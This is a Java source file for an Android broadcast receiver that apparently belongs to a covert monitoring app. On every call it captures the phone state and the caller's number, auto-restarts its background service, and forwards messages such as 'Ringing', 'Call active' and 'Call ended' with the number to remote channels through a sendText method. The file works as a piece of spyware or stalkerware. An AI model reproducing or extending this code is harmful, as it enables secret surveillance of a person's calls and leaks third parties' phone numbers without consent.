package com.tenix.karasu;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.telephony.TelephonyManager;

public class CallReceiver extends BroadcastReceiver {

    private static String lastState  = null;
    private static String lastNumber = "";

    @Override
    public void onReceive(Context ctx, Intent intent) {
        if (krs.instance == null) {
            Intent s = new Intent(ctx, krs.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ctx.startForegroundService(s);
            else ctx.startService(s);
            return;
        }

        String state  = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
        String number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
        if (number != null && !number.isEmpty()) lastNumber = number;
        if (state == null || state.equals(lastState)) return;
        lastState = state;

        String msg;
        if (TelephonyManager.EXTRA_STATE_RINGING.equals(state)) {
            msg = "📲 Ringing: " + lastNumber;
        } else if (TelephonyManager.EXTRA_STATE_OFFHOOK.equals(state)) {
            msg = "📞 Call active: " + lastNumber;
        } else if (TelephonyManager.EXTRA_STATE_IDLE.equals(state)) {
            msg = "📴 Call ended: " + lastNumber;
            lastNumber = "";
        } else {
            return;
        }

        for (String ch : krs.instance.parseChannels()) {
            krs.instance.sendText("📞 *Call Event*\n" + msg, ch);
        }
    }
}
